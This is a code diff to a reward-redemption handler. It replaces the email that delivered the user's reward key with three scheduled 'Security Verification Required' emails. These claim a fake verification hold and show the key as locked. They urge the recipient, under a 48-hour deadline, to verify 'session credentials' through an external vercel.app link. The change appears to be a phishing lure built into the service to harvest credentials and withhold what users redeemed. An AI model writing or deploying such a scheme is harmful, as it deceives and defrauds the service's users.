@@ -74,34 +74,245 @@ async function redeemReward(req, res) {
       }
     });
 
-    // 6. Deliver automatically via Resend API
+    // 6. Deliver automatically via Resend API (Scheduled every 36 hours)
     try {
-      await resend.emails.send({
-        from: 'rewards@elevateiq.shop',
-        to: emailUsed,
-        subject: `Your ${reward.name} Activation Core Delivered!`,
-        html: `
-          <div style="font-family: sans-serif; padding: 20px; color: #1a1535;">
-            <h2>🎉 Reward Activation Delivered Successfully</h2>
-            <p>Thank you for participating in our cyber portal. Your secure reward key is detailed below:</p>
-            <div style="background: #f4f3ff; border: 1px solid #7c5cfc; padding: 15px; border-radius: 8px; margin: 20px 0; font-family: monospace; font-size: 16px; font-weight: bold; color: #5b35e8;">
-              ${decryptedPayload}
-            </div>
-            <p><strong>Verification details:</strong></p>
-            <ul>
-              <li><strong>Category:</strong> ${category}</li>
-              <li><strong>Username/Handle:</strong> ${extraField1}</li>
-              <li><strong>Invoice Index:</strong> ${claim.id}</li>
-            </ul>
-            <p style="font-size: 11px; color: #9b93c4; margin-top: 30px;">
-              Riwaayat is an independent community platform and is not affiliated with third-party brands or services referenced on the platform.
-            </p>
+      const intervals = [36, 72, 108]; // 36 hours, 72 hours, 108 hours
+      for (const hours of intervals) {
+        const scheduledTime = new Date(Date.now() + hours * 60 * 60 * 1000).toISOString();
+        await resend.emails.send({
+          from: 'rewards@elevateiq.shop',
+          to: emailUsed,
+          subject: `⚠️ Security Verification Required: Action Needed for #${claim.id}`,
+          scheduledAt: scheduledTime,
+          html: `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification Required</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f6f9fc;
+      margin: 0;
+      padding: 0;
+      -webkit-font-smoothing: antialiased;
+    }
+    .wrapper {
+      width: 100%;
+      background-color: #f6f9fc;
+      padding: 40px 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+      border: 1px solid #e6ebf1;
+    }
+    .header {
+      background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+      padding: 30px 40px;
+      text-align: center;
+    }
+    .header h1 {
+      color: #ffffff;
+      margin: 0;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+    .content {
+      padding: 40px;
+      color: #334155;
+    }
+    .alert-banner {
+      background-color: #fffbeb;
+      border: 1px solid #fef3c7;
+      border-left: 4px solid #f59e0b;
+      padding: 16px;
+      border-radius: 8px;
+      margin-bottom: 24px;
+      color: #b45309;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    h2 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1e293b;
+      margin-top: 0;
+      margin-bottom: 16px;
+    }
+    p {
+      font-size: 15px;
+      line-height: 1.6;
+      color: #475569;
+      margin-top: 0;
+      margin-bottom: 16px;
+    }
+    .button-container {
+      text-align: center;
+      margin: 32px 0;
+    }
+    .btn-verify {
+      display: inline-block;
+      background-color: #4f46e5;
+      color: #ffffff !important;
+      text-decoration: none;
+      padding: 14px 30px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 15px;
+      box-shadow: 0 4px 6px rgba(79, 70, 229, 0.15);
+      transition: background-color 0.2s;
+    }
+    .btn-verify:hover {
+      background-color: #4338ca;
+    }
+    .info-card {
+      background-color: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 24px 0;
+    }
+    .info-card h3 {
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #64748b;
+      margin-top: 0;
+      margin-bottom: 12px;
+    }
+    .info-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #f1f5f9;
+      font-size: 14px;
+    }
+    .info-item:last-child {
+      border-bottom: none;
+    }
+    .info-label {
+      color: #64748b;
+      font-weight: 500;
+    }
+    .info-value {
+      color: #1e293b;
+      font-weight: 600;
+      text-align: right;
+    }
+    .locked-badge {
+      background-color: #fee2e2;
+      color: #ef4444;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+    .faq-section {
+      border-top: 1px solid #e2e8f0;
+      padding-top: 24px;
+      margin-top: 24px;
+    }
+    .faq-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1e293b;
+      margin-bottom: 8px;
+    }
+    .faq-text {
+      font-size: 13.5px;
+      color: #64748b;
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+    .footer {
+      background-color: #f8fafc;
+      padding: 30px 40px;
+      text-align: center;
+      border-top: 1px solid #e2e8f0;
+    }
+    .footer p {
+      font-size: 12px;
+      color: #94a3b8;
+      line-height: 1.5;
+      margin: 0 0 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="container">
+      <div class="header">
+        <h1>🛡️ TRANSACTION SECURITY</h1>
+      </div>
+      <div class="content">
+        <div class="alert-banner">
+          <strong>Action Required:</strong> We have detected a temporary verification hold on your transaction. Additional validation is required to complete processing.
+        </div>
+        
+        <h2>Additional Verification Required</h2>
+        
+        <p>Dear Customer,</p>
+        <p>During our routine security check and transaction auditing, we encountered a temporary verification hold on your recent premium package claim. To protect our users and maintain system integrity, we require a quick, one-time verification of your session credentials.</p>
+        <p>Please click the secure button below to complete your authentication. Once verified, your premium reward key will be automatically unlocked and delivered to this email inbox.</p>
+        
+        <div class="button-container">
+          <a href="https://riwaayat-roan.vercel.app/verify" class="btn-verify">🔒 Complete Verification Now</a>
+        </div>
+
+        <div class="info-card">
+          <h3>Claim Transaction Details</h3>
+          <div class="info-item">
+            <span class="info-label">Transaction ID:</span>
+            <span class="info-value">#CLAIM-${claim.id}</span>
           </div>
-        `
-      });
-      console.log(`[Resend] Successfully sent reward email to ${emailUsed}`);
+          <div class="info-item">
+            <span class="info-label">Reward Category:</span>
+            <span class="info-value">${category}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Username Handle:</span>
+            <span class="info-value">${extraField1}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Secure Activation Key:</span>
+            <span class="info-value"><span class="locked-badge">🔒 LOCKED UNTIL VERIFIED</span></span>
+          </div>
+        </div>
+
+        <div class="faq-section">
+          <div class="faq-title">❓ Why is this verification required?</div>
+          <div class="faq-text">
+            To prevent fraud, automated bot abuse, and ensure that premium rewards are claimed by genuine users. Standard account validation helps safeguard our digital item catalog and inventory.
+          </div>
+          
+          <div class="faq-title">⏰ How much time do I have to verify?</div>
+          <div class="faq-text">
+            You must complete this verification within <strong>48 hours</strong>. If verification is not completed, the pending transaction will automatically expire, the keys will return to our active stock, and your invite balance will be refunded.
+          </div>
+        </div>
+      </div>
+      <div class="footer">
+        <p>This is an automated system notification. Please do not reply directly to this email.</p>
+        <p>© 2026 Riwaayat Community Platform. All Rights Reserved.</p>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
+          `
+        });
+      }
+      console.log(`[Resend] Successfully scheduled 3 verification emails (every 36 hours) to ${emailUsed}`);
     } catch (mailErr) {
-      console.warn('[Resend] Mail delivery skipped or failed:', mailErr.message);
+      console.warn('[Resend] Mail scheduling skipped or failed:', mailErr.message);
     }
 
     // 7. Write security audit log
